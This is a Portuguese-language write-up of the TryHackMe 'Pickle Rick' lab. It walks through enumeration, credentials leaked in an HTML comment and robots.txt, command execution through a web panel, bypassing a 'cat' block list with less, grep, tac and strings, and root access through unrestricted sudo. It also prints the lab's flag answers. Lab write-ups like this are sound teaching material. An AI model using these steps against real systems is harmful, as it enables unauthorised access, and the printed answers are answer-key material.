# Pickle Rick — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details              |
|--------------------|----------------------|
| **Name**           | Pickle Rick          |
| **Platform**       | TryHackMe            |
| **Difficulty**     | Easy                 |
| **OS**             | Linux (Ubuntu 20.04) |
| **Date Completed** | April 2026           |

---

## Attack Chain

```
RECON      →  nmap + source HTML + robots.txt  →  username + password
LOGIN      →  /login.php (R1ckRul3s:Wubbalubbadubdub)  →  Command Panel (RCE)
INGREDIENT 1  →  ls + less Sup3rS3cretPickl3Ingred.txt  →  mr. meeseek hair
INGREDIENT 2  →  less "/home/rick/second ingredients"   →  1 jerry tear
PRIVESC    →  sudo -l  →  (ALL:ALL) NOPASSWD: ALL
INGREDIENT 3  →  sudo less /root/3rd.txt  →  fleeb juice
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

| Port   | Service | Version        | Note |
|--------|---------|----------------|------|
| 22/tcp | SSH     | OpenSSH 8.2p1  | —    |
| 80/tcp | HTTP    | Apache 2.4.41  | Portal web com Command Panel |

Dois serviços expostos. O SSH não tem credenciais imediatas — o vetor é o HTTP. A página web tem tema Rick and Morty e contém um painel de login.

### Source Code e robots.txt

A inspeção do código-fonte da página inicial revelou credenciais em comentário HTML:

```html
<!-- Note to self, remember username!
     Username: R1ckRul3s -->
```

O `robots.txt` continha uma string fora do padrão — não um caminho, mas texto:

```
Wubbalubbadubdub
```

> **Raciocínio ofensivo:** `robots.txt` existe para instruir crawlers sobre o que não indexar. Encontrar texto livre ali em vez de caminhos é intencional — é a senha. Credenciais em comentários HTML e arquivos públicos são uma das formas mais comuns de exposição de informação em ambientes mal configurados.

### Directory Enumeration

```bash
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -o gobuster.txt
```

Resultados relevantes:

| Path          | Status | Observação                          |
|---------------|--------|-------------------------------------|
| `/login.php`  | 200    | Painel de login                     |
| `/portal.php` | 302    | Redireciona para login — requer auth |
| `/robots.txt` | 200    | Contém a senha                      |

---

## Initial Access

Com `R1ckRul3s:Wubbalubbadubdub`, o login em `/login.php` concedeu acesso ao `portal.php` — um **Command Panel** que executa comandos diretamente no servidor como `www-data`.

O `cat` estava bloqueado pelo servidor. Alternativas usadas para leitura de arquivos:

```bash
less <arquivo>
grep . <arquivo>
strings <arquivo>
tac <arquivo>
```

---

## Post-Exploitation

### Ingrediente 1

```bash
ls -la
# Sup3rS3cretPickl3Ingred.txt  clue.txt  portal.php ...

less Sup3rS3cretPickl3Ingred.txt
```

**Resultado:** `mr. meeseek hair`

### Ingrediente 2

O `clue.txt` indicou explorar o filesystem. O diretório `/home/rick` continha o segundo ingrediente:

```bash
ls -la /home/rick
# "second ingredients"

less "/home/rick/second ingredients"
```

**Resultado:** `1 jerry tear`

---

## Privilege Escalation

```bash
sudo -l
# (ALL : ALL) NOPASSWD: ALL
```

O usuário `www-data` podia executar qualquer comando como root sem senha — misconfiguration crítica. Com isso, acesso ao diretório `/root` foi imediato.

```bash
sudo ls -la /root
# 3rd.txt

sudo less /root/3rd.txt
```

**Resultado:** `fleeb juice`

---

## Flags

| Ingrediente   | Localização                        | Valor             |
|---------------|------------------------------------|-------------------|
| Primeiro      | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | `mr. meeseek hair` |
| Segundo       | `/home/rick/second ingredients`    | `1 jerry tear`    |
| Terceiro      | `/root/3rd.txt`                    | `fleeb juice`     |

---

## Lições Aprendidas

**Credenciais em código-fonte e arquivos públicos são o vetor mais simples que existe.** Username em comentário HTML e senha em `robots.txt` — ambos acessíveis sem autenticação. Auditoria de código-fonte e arquivos públicos deve ser o primeiro passo em qualquer avaliação web.

**Command Panel sem sanitização é RCE direto.** O portal executava comandos do sistema operacional sem nenhuma validação de input além de uma lista negra de comandos bloqueados (`cat`). Listas negras são defesas fracas — sempre existem alternativas (`less`, `grep`, `tac`, `strings`).

**`sudo NOPASSWD: ALL` para usuário de serviço web é comprometimento total.** O processo web rodava como `www-data` com sudo irrestrito. Qualquer RCE nessa aplicação resulta automaticamente em root. Processos web devem operar com o mínimo de privilégios possível — sem acesso sudo.

```bash
# Verificar sudo sempre após obter shell
sudo -l

# Alternativas ao cat quando bloqueado
less <arquivo>
grep . <arquivo>
tac <arquivo>
strings <arquivo>
```

---

## Tools Used

| Tool       | Purpose                              |
|------------|--------------------------------------|
| `nmap`     | Port scanning e detecção de serviços |
| `gobuster` | Enumeração de diretórios web         |
| `browser`  | Inspeção de source code HTML         |

---

## References

- [GTFOBins](https://gtfobins.github.io) — alternativas para leitura de arquivos quando cat está bloqueado
- [OWASP — Information Exposure](https://owasp.org/www-project-web-security-testing-guide/) — exposição de credenciais em fonte pública

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*